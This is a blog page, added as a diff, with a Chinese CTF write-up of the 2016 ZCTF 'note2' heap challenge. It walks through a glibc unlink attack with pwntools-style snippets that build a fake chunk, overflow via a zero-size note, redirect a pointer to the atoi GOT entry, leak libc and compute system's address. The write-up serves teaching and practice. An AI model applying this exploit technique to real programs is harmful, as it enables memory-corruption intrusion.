@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2016_zctf note2 - d00m
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> GO ON OR GIVE UP </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>d00m</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#执行程序-静态分析"><span class="toc-text">执行程序 + 静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#生成3个note"><span class="toc-text">生成3个note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#释放-chunk1-覆盖-chunk2-释放-chunk2"><span class="toc-text">释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> GO ON OR GIVE UP </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2016_zctf note2
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-09-08 03:20:44</span></span>
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p><a href="https://github.com/doom-man/ctf/tree/master/2015-hacklu-bookstore" target="_blank" rel="noopener">程序</a></p>
+<p>又是涨新知识的一题。<br>先检查程序的防护。<br><img src="B5D5252723E243A49162266744D10846" alt="image"></p>
+<h4 id="执行程序-静态分析"><a href="#执行程序-静态分析" class="headerlink" title="执行程序 + 静态分析"></a>执行程序 + 静态分析</h4><ol>
+<li>输入name , address  </li>
+<li><ol>
+<li>new note 记录size 和 堆指针</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>show note</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>edit note 覆盖已有note，并在note后面添加内容</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>free note</li>
+</ol>
+</li>
+</ol>
+<p><img src="EB322A7382E1419CB650BDA00B12A5DD" alt="image"></p>
+<p><img src="EED2EAE9062241A08E23D64362F3843A" alt="image"><br><img src="AE027BB90D7141D7BAE4180B9528823A" alt="image"></p>
+<p>chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p>
+<h4 id="生成3个note"><a href="#生成3个note" class="headerlink" title="生成3个note"></a>生成3个note</h4><p>构造3个chunk, chunk0 chunk1 chunk2</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk0: a fake chunk</span></span><br><span class="line">ptr = 0x0000000000602120</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)</span><br><span class="line"><span class="comment">#content = p64(fakefd) + p64(fakebk)</span></span><br><span class="line">newnote(128, content)</span><br><span class="line"><span class="comment"># chunk1: a zero size chunk produce overwrite</span></span><br><span class="line">newnote(0, 'a' * 8)</span><br><span class="line"><span class="comment"># chunk2: a chunk to be overwrited and freed</span></span><br><span class="line">newnote(0x80, 'b' * 16)</span><br></pre></td></tr></table></figure>
+
+<p><img src="58E9A8EF307A4455BC0306F2FB127BB0" alt="image"></p>
+<p>当构造完三个 note 后，堆的基本构造如图 1 所示。</p>
+<p><img src="E60592DF75B74BD29D62117E56E1119B" alt="image"></p>
+<h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = 'a' * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>, content)</span><br><span class="line"># delete note <span class="number">2</span> to trigger the unlink</span><br><span class="line"># after unlink, ptr[<span class="number">0</span>] = ptr - <span class="number">0x18</span></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk（因为edit note 函数里面<br><img src="EB58D1F1067D4E209612E8318E889553" alt="image"> 并没有存在溢出<br>），同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。<br><img src="C6B21A7CA8554AA397D677B7CC23431E" alt="image"></p>
+<p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p>
+<pre><code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</code></pre><p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p>
+<p>而系统仍然认为ptr[0] 指向堆区 ，</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = note2.got['atoi']</span><br><span class="line">content = 'a' * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"><span class="comment">#将地址指向atoi</span></span><br><span class="line">shownote()</span><br><span class="line"><span class="comment">#获取地址</span></span><br><span class="line">sh.recvuntil('is ')</span><br><span class="line">atoi_addr = sh.recvuntil('\n', drop=True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(8, '\x00'))</span><br><span class="line">print 'leak atoi addr: ' + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get system addr 通过偏移得到system 地址</span></span><br><span class="line">atoi_offest = libc.symbols['atoi']</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols['system']</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print 'leak system addr: ', hex(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/doom-man">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
